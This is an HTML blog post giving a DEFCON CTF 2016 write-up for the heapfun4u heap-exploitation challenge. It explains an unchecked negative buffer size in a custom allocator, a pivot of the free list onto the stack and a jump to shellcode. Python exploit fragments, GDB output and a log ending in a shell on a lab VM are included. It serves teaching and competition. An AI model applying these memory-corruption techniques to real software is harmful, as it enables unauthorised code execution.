@@ -1,0 +1,189 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name=viewport><meta content=BlahCats name=author><meta content="Tales of a binary encoded life..." name=description><meta prefix="og: http://ogp.me/ns#" content=BlahCats property=og:site_name><meta prefix="og: http://ogp.me/ns#" content=blog property=og:type><meta content="DEFCON CTF 2016 - heapfun4u" prefix="og: http://ogp.me/ns#" property=og:title><meta content="DEFCON CTF 2016 - heapfun4u - by hugsy" prefix="og: http://ogp.me/ns#" property=og:description><meta prefix="og: http://ogp.me/ns#" content=en_US property=og:locale><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/2016-05-24-defcon-ctf-2016-heapfun4u property=og:url><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/img/blog-cover.png property=og:image><meta content=summary_large_image name=twitter:card><meta content=@ctf_blahcat name=twitter:site><meta content=BlahCats name=twitter:title><meta content="DEFCON CTF 2016 - heapfun4u - by hugsy" name=twitter:description><meta content=https://blahcat.github.io/2016-05-24-defcon-ctf-2016-heapfun4u name=twitter:url><meta content=https://blahcat.github.io/img/blog-cover.png name=twitter:image:src><script type=application/ld+json>
+    {
+      "@context" : "http://schema.org",
+      "@type" : "Website",
+      "name": " BlahCats",
+      "url" : "https://blahcat.github.io/2016-05-24-defcon-ctf-2016-heapfun4u",
+      
+      "image": https://blahcat.github.io/img/blog-cover.png",
+      
+      
+      "description": DEFCON CTF 2016 - heapfun4u - by hugsy",
+      
+    }
+    </script><title>
+  DEFCON CTF 2016 - heapfun4u
+</title><link href=https://blahcat.github.io/img/favicon.ico rel=icon type=image/x-icon><link href=https://blahcat.github.io/css/bootstrap.min.css rel=stylesheet><link href=" https://blahcat.github.io/css/all.min.css" rel=" stylesheet"><link href="https://fonts.googleapis.com/css?family=Roboto" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Montserrat:400,300" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lato" -- <!-- custom for rel=stylesheet styles template this><link href=https://blahcat.github.io/css/clean-blog.css rel=stylesheet><link href=https://blahcat.github.io/css/overrides.css rel=stylesheet><link integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css referrerpolicy=no-referrer rel=stylesheet><body><nav class="navbar navbar-expand-lg navbar-light fixed-top" id=mainNav><div class=container><a class=navbar-brand href=https://blahcat.github.io>BlahCats Blog</a><button aria-label="Toggle navigation" class="navbar-toggler navbar-toggler-right" aria-controls=navbarResponsive aria-expanded=false data-target=#navbarResponsive data-toggle=collapse type=button>Menu <i class="fas fa-bars"></i></button><div class="collapse navbar-collapse" id=navbarResponsive><ul class="navbar-nav ml-auto"><li class=nav-item><a class=nav-link href=https://blahcat.github.io>Home</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/series>Series</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/notes>Notes</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/about>About</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/qemu>Qemu VMs</a></ul></div></div></nav><header class=masthead style=background-image:url(https://blahcat.github.io/img/blog-cover.png)><div class=overlay></div><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><div class=post-heading><h1>DEFCON CTF 2016 - heapfun4u</h1><span class=meta> <b> • <a href=/author/hugsy>hugsy</a> • </b> 24 May 2016 <br> <br> <i>Reading time: 7 min</i> </span></div></div></div></div></header><article><article class=post><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><h3 id=info>Info</h3><p>The vulnerable file was given with the following instructions:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>Guess what, it is a heap bug
+</span></code></pre><p>So yes, we’ll be dealing with some heap fun.<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>gef➤</span><span>  !file ./heapfun4u
+</span><span style=color:#bf616a>./heapfun4u:</span><span> ELF 64-bit LSB executable, x86-64, version 1 (SYSV)</span><span style=color:#bf616a>,</span><span> dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID</span><span style=color:#b48ead>[</span><span>sha1</span><span style=color:#b48ead>]</span><span>=b019e6cbed93d55ebef500e8c4dec79ce592fa42, stripped
+</span><span style=color:#bf616a>gef➤</span><span>  checksec
+</span><span style=color:#bf616a>[+]</span><span> checksec for '</span><span style=color:#a3be8c>/home/vagrant/heapfun4u</span><span>'
+</span><span style=color:#bf616a>Canary:</span><span>                                           No
+</span><span style=color:#bf616a>NX</span><span> Support:                                       Yes
+</span><span style=color:#bf616a>PIE</span><span> Support:                                      No
+</span><span style=color:#bf616a>No</span><span> RPATH:                                         Yes
+</span><span style=color:#bf616a>No</span><span> RUNPATH:                                       Yes
+</span><span style=color:#bf616a>Partial</span><span> RelRO:                                    Yes
+</span><span style=color:#bf616a>Full</span><span> RelRO:                                       No
+</span></code></pre><p><code>heapfun4u</code> is a tool that manages its own heap allocator to allocate and free buffers. On top of those actions, another command allows to write directly into one of those buffers. The last command is a helper to leak an address in the stack:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>gef➤</span><span>  c
+</span><span style=color:#bf616a>Continuing.
+</span><span style=color:#bf616a>[A]llocate</span><span> Buffer
+</span><span style=color:#bf616a>[F]ree</span><span> Buffer
+</span><span style=color:#bf616a>[W]rite</span><span> Buffer
+</span><span style=color:#bf616a>[N]ice</span><span> guy
+</span><span style=color:#bf616a>[E]xit
+</span><span>| </span><span style=color:#bf616a>N
+</span><span style=color:#bf616a>Here</span><span> you go: 0x7fffffffe16c
+</span></code></pre><h3 id=vulnerability>Vulnerability</h3><p>Allocating N bytes will:<ul><li>lookup in the free list (0x602558) for a free buffer of a bigger size. If not found:<li>create a buffer with the following structure:</ul><pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>struct</span><span> __buffer {
+</span><span>    qword size;
+</span><span>    void data</span><span style=color:#b48ead>[</span><span>N_rounded_size</span><span style=color:#b48ead>]</span><span>;
+</span><span>}
+</span></code></pre><ul><li>add a pointer to <code>struct __buffer->data</code> in an array at 0x6020A0 (in .bss)<li>store the size (N) of this buffer in an array at 0x6023C0</ul><p>There are many vulnerabilities in <code>heapfun4u</code> but an interesting one, is the fact that when allocating a new buffer, the tool fails to check the size of the new buffer to create. This means that we can provide negative-sized buffer:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>[A]llocate</span><span> Buffer
+</span><span style=color:#bf616a>[F]ree</span><span> Buffer
+</span><span style=color:#bf616a>[W]rite</span><span> Buffer
+</span><span style=color:#bf616a>[N]ice</span><span> guy
+</span><span style=color:#bf616a>[E]xit
+</span><span>| </span><span style=color:#bf616a>A
+</span><span style=color:#bf616a>Size: -1
+</span><span style=color:#bf616a>[A]llocate</span><span> Buffer
+</span><span style=color:#bf616a>[F]ree</span><span> Buffer
+</span><span style=color:#bf616a>[W]rite</span><span> Buffer
+</span><span style=color:#bf616a>[N]ice</span><span> guy
+</span><span style=color:#bf616a>[E]xit
+</span><span>| </span><span style=color:#bf616a>W
+</span><span style=color:#bf616a>1</span><span>) </span><span style=color:#bf616a>0x7ffff7ff4008</span><span> -- -1
+</span></code></pre><p>Which we confirm immediately in IDA:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>.text:0000000000400A28</span><span> mov     edx, 0FFh       ; </span><span style=color:#bf616a>nbytes
+</span><span style=color:#bf616a>.text:0000000000400A2D</span><span> mov     rsi, rax        ; </span><span style=color:#bf616a>buf
+</span><span style=color:#bf616a>.text:0000000000400A30</span><span> mov     edi, 0          ; </span><span style=color:#bf616a>fd
+</span><span style=color:#bf616a>.text:0000000000400A35</span><span> call    _read           ;; </span><span style=color:#bf616a>read</span><span>(0, &</span><span style=color:#bf616a>stdin_buffer,</span><span> 0xFF)
+</span><span>
+</span><span style=color:#bf616a>.text:0000000000400A49</span><span> lea     rax, </span><span style=color:#b48ead>[</span><span>rbp+stdin_buffer</span><span style=color:#b48ead>]
+</span><span style=color:#bf616a>.text:0000000000400A50</span><span> mov     rdi, rax        ; </span><span style=color:#bf616a>nptr
+</span><span style=color:#bf616a>.text:0000000000400A53</span><span> call    _atoi
+</span><span style=color:#bf616a>.text:0000000000400A58</span><span> mov     </span><span style=color:#b48ead>[</span><span>rbp+size</span><span style=color:#b48ead>]</span><span>, eax
+</span><span style=color:#bf616a>.text:0000000000400A5B</span><span> mov     ebx, cs:index
+</span><span style=color:#bf616a>.text:0000000000400A61</span><span> mov     eax, </span><span style=color:#b48ead>[</span><span>rbp+sz</span><span style=color:#b48ead>]
+</span><span style=color:#bf616a>.text:0000000000400A64</span><span> mov     edi, eax
+</span><span style=color:#bf616a>.text:0000000000400A66</span><span> call    allocate_buffer  ;; </span><span style=color:#bf616a>no</span><span> check on size before call to allocate_buffer(size)
+</span></code></pre><p>This is an issue because the <code>free_buffer(data_ptr)</code> assumes that it will find the length of the chunk at <code>data_ptr - 8</code> and use this location to store a pointer to the <code>head_free_list_ptr</code>. This means that, at the next allocation after the <code>free()</code>, this pointer (which we now control) will be dereferenced.<h3 id=exploitation>Exploitation</h3><h4 id=dereferencing-an-arbitrary-location>Dereferencing an arbitrary location</h4><p>To exploit this, we will use the vulnerability disclosed above to force the heap allocator to make an allocation directly inside the stack (whose address is known thanks to the “Nice guy” command). So we need to:<ol><li>allocate 3 chunks, the second allocated chunk must have a size of -1<li>free the 3rd chunk<li>free the 2nd chunk.</ol><pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>          |  size = N      |
+</span><span>          |  data          |
+</span><span>          |   ..           |
+</span><span>          |                |
+</span><span>          |                |
+</span><span>          |  ptr_to_stack  |
+</span><span>          |  size = -1     |
+</span><span>          |  size = M      |
+</span><span>          |  data          |
+</span><span>          |                |
+</span><span>          |                |
+</span></code></pre><p>Upon the 2nd free, we will gain control of the <code>head_free_list_ptr</code>:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>  sz = </span><span style=color:#d08770>128
+</span><span>  </span><span style=color:#bf616a>allocate</span><span>(s, sz)
+</span><span>  </span><span style=color:#bf616a>allocate</span><span>(s, -</span><span style=color:#d08770>1</span><span>)
+</span><span>  </span><span style=color:#bf616a>allocate</span><span>(s, </span><span style=color:#d08770>10</span><span>)
+</span><span>
+</span><span>  </span><span style=color:#bf616a>free</span><span>(s, "</span><span style=color:#a3be8c>3</span><span>")
+</span><span>  </span><span style=color:#bf616a>free</span><span>(s, "</span><span style=color:#a3be8c>2</span><span>")
+</span><span>
+</span><span>  payload = "</span><span style=color:#a3be8c>A</span><span>"*(sz-</span><span style=color:#d08770>8</span><span>) + </span><span style=color:#bf616a>p64</span><span>(</span><span style=color:#d08770>0x4242424242424242</span><span>)
+</span><span>  </span><span style=color:#bf616a>write</span><span>(s, </span><span style=color:#d08770>1</span><span>, payload)
+</span></code></pre><p>The next allocation will attempt to dereference the address 0x4242424242424242 to see if it’s a suitable buffer:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>  </span><span style=color:#bf616a>allocate</span><span>(s, </span><span style=color:#d08770>0x200</span><span>)
+</span></code></pre><p>And as expected:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>gef➤</span><span>  c
+</span><span style=color:#bf616a>Continuing.
+</span><span>
+</span><span style=color:#bf616a>Program</span><span> received signal SIGSEGV, Segmentation fault.
+</span><span style=color:#bf616a>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[registers]──
+</span><span>$</span><span style=color:#bf616a>rax</span><span>     0x4242424242424242 $</span><span style=color:#bf616a>rbx</span><span>     0x0000000000000003 $</span><span style=color:#bf616a>rcx</span><span>     0x00007f580ed92ac0 $</span><span style=color:#bf616a>rdx</span><span>     0x0000000000000000 $</span><span style=color:#bf616a>rsp</span><span>     0x00007ffceb5f8a70 $</span><span style=color:#bf616a>rbp</span><span>     0x00007ffceb5f8ad0
+</span><span>$</span><span style=color:#bf616a>rsi</span><span>     0x00007ffceb5f8ae3 $</span><span style=color:#bf616a>rdi</span><span>     0x0000000000000200 $</span><span style=color:#bf616a>rip</span><span>     0x0000000000400d77 $</span><span style=color:#bf616a>r8</span><span>      0x00007f580efe1500 $</span><span style=color:#bf616a>r9</span><span>      0x0000000000000200 $</span><span style=color:#bf616a>r10</span><span>     0x000000000000000a
+</span><span>$</span><span style=color:#bf616a>r11</span><span>     0x1999999999999999 $</span><span style=color:#bf616a>r12</span><span>     0x00000000004006b0 $</span><span style=color:#bf616a>r13</span><span>     0x00007ffceb5f8ce0 $</span><span style=color:#bf616a>r14</span><span>     0x0000000000000000 $</span><span style=color:#bf616a>r15</span><span>     0x0000000000000000 $</span><span style=color:#bf616a>cs</span><span>      0x0000000000000033
+</span><span>$</span><span style=color:#bf616a>ss</span><span>      0x000000000000002b $</span><span style=color:#bf616a>ds</span><span>      0x0000000000000000 $</span><span style=color:#bf616a>es</span><span>      0x0000000000000000 $</span><span style=color:#bf616a>fs</span><span>      0x0000000000000000 $</span><span style=color:#bf616a>gs</span><span>      0x0000000000000000 $</span><span style=color:#bf616a>eflags  </span><span style=color:#b48ead>[</span><span> PF IF RF </span><span style=color:#b48ead>]
+</span><span style=color:#bf616a>Flags: </span><span style=color:#b48ead>[</span><span> carry  PARITY  adjust  zero  sign  trap  INTERRUPT  direction  overflow  RESUME  virtualx86  identification </span><span style=color:#b48ead>]
+</span><span style=color:#bf616a>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[stack]──
+</span><span style=color:#bf616a>0x00007ffceb5f8a70│+0x00: -0x1</span><span>		← $</span><span style=color:#bf616a>sp
+</span><span style=color:#bf616a>0x00007ffceb5f8a78│+0x08:</span><span> 0x2000efe1740
+</span><span style=color:#bf616a>0x00007ffceb5f8a80│+0x10:</span><span> 0x00007f580ed92a35 → 0x0
+</span><span style=color:#bf616a>0x00007ffceb5f8a88│+0x18:</span><span> 0x00007ffceb5f8ae0 → "</span><span style=color:#a3be8c>512[...]</span><span>"
+</span><span style=color:#bf616a>0x00007ffceb5f8a90│+0x20:</span><span> 0x00007ffceb5f8ce0 → 0x1
+</span><span style=color:#bf616a>0x00007ffceb5f8a98│+0x28:</span><span> 0x2
+</span><span style=color:#bf616a>0x00007ffceb5f8aa0│+0x30:</span><span> 0x4242424242424242
+</span><span style=color:#bf616a>0x00007ffceb5f8aa8│+0x38:</span><span> 0x00000000004006b0 → xor ebp,ebp
+</span><span style=color:#bf616a>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[code:i386:x86-64]──
+</span><span style=color:#bf616a>0x400d67</span><span>	 mov    QWORD PTR </span><span style=color:#b48ead>[</span><span>rbp-0x8</span><span style=color:#b48ead>]</span><span>,rax
+</span><span style=color:#bf616a>0x400d6b</span><span>	 mov    rax,QWORD PTR </span><span style=color:#b48ead>[</span><span>rbp-0x8</span><span style=color:#b48ead>]
+</span><span style=color:#bf616a>0x400d6f</span><span>	 mov    QWORD PTR </span><span style=color:#b48ead>[</span><span>rbp-0x30</span><span style=color:#b48ead>]</span><span>,rax
+</span><span style=color:#bf616a>0x400d73</span><span>	 mov    rax,QWORD PTR </span><span style=color:#b48ead>[</span><span>rbp-0x8</span><span style=color:#b48ead>]
+</span><span style=color:#bf616a>0x400d77</span><span>	 mov    rax,QWORD PTR </span><span style=color:#b48ead>[</span><span>rax</span><span style=color:#b48ead>]</span><span> 		 ← $</span><span style=color:#bf616a>pc
+</span><span style=color:#bf616a>0x400d7a</span><span>	 and    rax,0xfffffffffffffffc
+</span><span style=color:#bf616a>0x400d7e</span><span>	 lea    rdx,</span><span style=color:#b48ead>[</span><span>rax-0x8</span><span style=color:#b48ead>]
+</span><span style=color:#bf616a>0x400d82</span><span>	 mov    rax,QWORD PTR </span><span style=color:#b48ead>[</span><span>rbp-0x8</span><span style=color:#b48ead>]
+</span><span style=color:#bf616a>[...]
+</span></code></pre><p>We now need to create a good setup in the stack to have <code>heapfun4u</code> believe its a valid region for allocation.<h4 id=pivoting-to-stack>Pivoting to stack</h4><p>To pivot to the stack, we first needed to know exactly the exactly of $rbp when the last call to <code>allocate_buffer()</code> is made. Luckily, as said early, the command “Nice guy” will provide use with such information.<p>The stack layout is hard to fully control at the level of the <code>allocate_buffer()</code> function. However, this function is called by the <code>main()</code> function, which uses a very large buffer (0x100 bytes) to store values read from stdin:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>.text:0000000000400905 ; int __cdecl main(int, char **, char **)
+</span><span>.text:0000000000400905 main proc near
+</span><span>.text:0000000000400905
+</span><span>.text:0000000000400905 stdin_buffer= byte ptr -120h    ;; <&LT-- this buffer provides a good place to land reliably
+</span><span>.text:0000000000400905 sz= dword ptr -14h
+</span></code></pre><p>Additionally, its location is very easy to pinpoint:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>               |       |    RetAddr       |
+</span><span>context of     |       |   SFP of main    |
+</span><span>main()         |       |     size         |
+</span><span>               |       |  buffer[0x100]   |
+</span><span>               |       |                  |                                 |
+</span><span>               |       |                  |                                 |
+</span><span>               |       |                  |                                 |
+</span><span>               |       |                  |                                 |
+</span><span>               V       |                  |                                 |
+</span><span>               |       |    RetAddr       |                                 |
+</span><span>               |       |      SFP         |                                 |
+</span><span>               |       |                  |          to the stack of main() V
+</span><span>allocate()     |       |                  |
+</span><span>               |       |                  |
+</span><span>               |       |                  |
+</span><span>               |       |                  |
+</span><span>               |       |                  |
+</span><span>               |       |                  |
+</span></code></pre><p>So now, we can point <code>head_free_list_ptr</code> to a location we fully control. All we need to write at this address a large value, for example 0x1000 so that when inspecting this address, <code>allocate_buffer()</code> will believe the buffer in the stack is large enough for the new allocation:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>padd = '</span><span style=color:#a3be8c>D</span><span>'*</span><span style=color:#d08770>126 </span><span>+ </span><span style=color:#bf616a>p64</span><span>(</span><span style=color:#d08770>0x1000</span><span>) + '</span><span style=color:#a3be8c>B</span><span>'*</span><span style=color:#d08770>8 </span><span>+ '</span><span style=color:#a3be8c>C</span><span>'*</span><span style=color:#d08770>8
+</span><span style=color:#bf616a>free</span><span>(s, "</span><span style=color:#a3be8c>2</span><span>" + "</span><span style=color:#96b5b4>\0</span><span>" + padd)
+</span><span>
+</span><span style=color:#bf616a>allocate</span><span>(s, </span><span style=color:#d08770>512</span><span>)
+</span></code></pre><p>We have now an allocation in stack:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>[A]llocate</span><span> Buffer
+</span><span style=color:#bf616a>[F]ree</span><span> Buffer
+</span><span style=color:#bf616a>[W]rite</span><span> Buffer
+</span><span style=color:#bf616a>[N]ice</span><span> guy
+</span><span style=color:#bf616a>[E]xit
+</span><span>| </span><span style=color:#bf616a>W
+</span><span style=color:#bf616a>1</span><span>) </span><span style=color:#bf616a>0x7f06cd628008</span><span> -- 128
+</span><span style=color:#bf616a>2</span><span>) </span><span style=color:#bf616a>0x7f06cd628090</span><span> -- -1
+</span><span style=color:#bf616a>3</span><span>) </span><span style=color:#bf616a>0x7f06cd628098</span><span> -- 10
+</span><span style=color:#bf616a>4</span><span>) </span><span style=color:#bf616a>0x7fffffffe458</span><span> -- 512
+</span><span style=color:#bf616a>^C
+</span><span style=color:#bf616a>gef➤</span><span>  xinfo 0x00007fffffffe458
+</span><span style=color:#bf616a>────────────────────────────────────────────────────[</span><span> xinfo: 0x7fffffffe458 ]──────────────────────────────────────
+</span><span style=color:#bf616a>Found</span><span> 0x00007fffffffe458
+</span><span style=color:#bf616a>Page:</span><span> 0x00007ffffffde000 → 0x00007ffffffff000 (size=0x21000)
+</span><span style=color:#bf616a>Permissions:</span><span> rw-
+</span><span style=color:#bf616a>Pathname: </span><span style=color:#b48ead>[</span><span>stack</span><span style=color:#b48ead>]
+</span><span style=color:#bf616a>Offset</span><span> (from page)</span><span style=color:#96b5b4>:</span><span> +0x20458
+</span><span style=color:#bf616a>Inode:</span><span> 0
+</span></code></pre><p>This means that we have transformed it into a regular stack overflow, simply by writing at the newly allocated address 0x7fffffffe458. Since, when allocating a new buffer, <code>heapfun4u</code> calls <code>mmap()</code> with Read|Write|Execute, we have plenty to location to drop our shellcode and jump to it.<p>This completes our execution steps.<h4 id=pwn>Pwn !</h4><p>Run the <a rel="noopener nofollow noreferrer" href=https://gist.github.com/hugsy/892495d2299189db06517ff9a0b6249b target=_blank>exploit code</a>:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>~/cur/heapfun4u</span><span> $ ./heapfun4u.py
+</span><span style=color:#bf616a>[+]</span><span> Connected to 172.28.128.4:3957
+</span><span style=color:#bf616a>Attach</span><span> with GDB and hit Enter
+</span><span style=color:#bf616a>[+]</span><span> rbp = 0x7ffc8c5d7ca0
+</span><span style=color:#bf616a>[+]</span><span> rsp = 0x7ffc8c5d7c40
+</span><span style=color:#bf616a>[+]</span><span> 1st allocation ok
+</span><span style=color:#bf616a>[+]</span><span> 2nd allocation ok
+</span><span style=color:#bf616a>[+]</span><span> 3rd allocation ok
+</span><span style=color:#bf616a>[+]</span><span> Leaked mmap-ed areas: 0x7f9c522fd008
+</span><span style=color:#bf616a>[+]</span><span> Free(#3) </span><span style=color:#bf616a>ok
+</span><span style=color:#bf616a>[+]</span><span> Free(#2) </span><span style=color:#bf616a>ok
+</span><span style=color:#bf616a>[+]</span><span> Overwriting pointer ok
+</span><span style=color:#bf616a>[+]</span><span> Stack pivot ok
+</span><span style=color:#bf616a>[+]</span><span> Overwriting rip ok
+</span><span style=color:#bf616a>[+]</span><span> Trigger return to 7f9c522fd008
+</span><span style=color:#bf616a>[+]</span><span> Switching to interactive...
+</span><span>
+</span><span style=color:#bf616a>To</span><span> run a command as administrator (user "</span><span style=color:#a3be8c>root</span><span>")</span><span style=color:#bf616a>,</span><span> use "</span><span style=color:#a3be8c>sudo &LTcommand></span><span>".
+</span><span style=color:#bf616a>See </span><span>"</span><span style=color:#a3be8c>man sudo_root</span><span>" for details.
+</span><span>
+</span><span style=color:#bf616a>vagrant@ubuntu-wily-15:/home/vagrant$</span><span> id
+</span><span style=color:#bf616a>id
+</span><span style=color:#bf616a>uid</span><span>=</span><span style=color:#a3be8c>1000</span><span>(</span><span style=color:#bf616a>vagrant</span><span>) gid=1000(vagrant) </span><span style=color:#bf616a>groups</span><span>=</span><span style=color:#a3be8c>1000</span><span>(</span><span style=color:#bf616a>vagrant</span><span>),4(adm)</span><span style=color:#bf616a>,24</span><span>(cdrom)</span><span style=color:#bf616a>,27</span><span>(sudo)</span><span style=color:#bf616a>,30</span><span>(dip)</span><span style=color:#bf616a>,46</span><span>(plugdev)</span><span style=color:#bf616a>,115</span><span>(lpadmin)</span><span style=color:#bf616a>,116</span><span>(sambashare) </span><span style=color:#bf616a>vagrant@ubuntu-wily-15:/home/vagrant$
+</span></code></pre><p>At that time, my teammate from TheGoonies <a class="fab fa-twitter" href=https://twitter.com/rick2600 target=_blank> <code>@rick2600</code> </a> had also read the flag file, which was:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>The flag is: Oh noze you pwned my h33p.
+</span></code></pre><aside class=post-tags><p>Categories: <a href=https://blahcat.github.io/categories/ctf/>#ctf</a><p>Tags: <a href=https://blahcat.github.io/tags/pwn/>#pwn</a> <a href=https://blahcat.github.io/tags/defcon-2016/>#defcon-2016</a> <a href=https://blahcat.github.io/tags/x86/>#x86</a> <a href=https://blahcat.github.io/tags/heap/>#heap</a></aside><aside class=post-discussion>Join the Discussion on <a href="https://github.com/blahcat/blahcat.github.io/discussions?discussions_q=DEFCON CTF 2016 - heapfun4u" target=_blank> <i class="fab fa-github fa-lg"></i> GitHub </a></aside><aside class=post-nav><div class=container><div class=row><div class=col><b>Next:</b><br><a class=post-nav-prev href=https://blahcat.github.io/2016-06-13-armpwn-challenge/> <section class=post-nav-teaser><b class=post-nav-title>ARMPWN challenge write-up</b><p class=post-nav-excerpt>Info A few weeks ago, I came across a GitHub repository created by @5aelo …</section> </a></div><div class=col><b>Previous:</b><br><a class=post-nav-next href=https://blahcat.github.io/2016-05-23-defcon-ctf-2016-feedme/> <section class=post-nav-teaser><b class=post-nav-title>DEFCON CTF 2016 - feedme</b><p class=post-nav-excerpt>Info The vulnerable file was given with the instructions: :::text Don&amp#39;t…</section> </a></div></div></div></aside></div></div><hr><footer><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><ul class="list-inline text-center"><li class=list-inline-item><a href=https://blahcat.github.io/atom.xml> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fas fa-rss fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://twitter.com/ctf_blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-twitter fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://github.com/blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-github fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://www.youtube.com/channel/UCDrgY65mRZWVoMiB5-VMqfg> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-youtube fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://discord.gg/hSbqxxBgRX> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-discord fa-stack-1x fa-inverse"></i> </span> </a></ul><p class="copyright text-muted">Made with ❤ with Zola</div></div></div></footer><script src=https://blahcat.github.io/js/jquery.min.js></script><script src=https://blahcat.github.io/js/bootstrap.bundle.min.js></script><script src=https://blahcat.github.io/js/clean-blog.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.1/mermaid.min.js></script><div class=mermaidTooltip style=opacity:0></div>
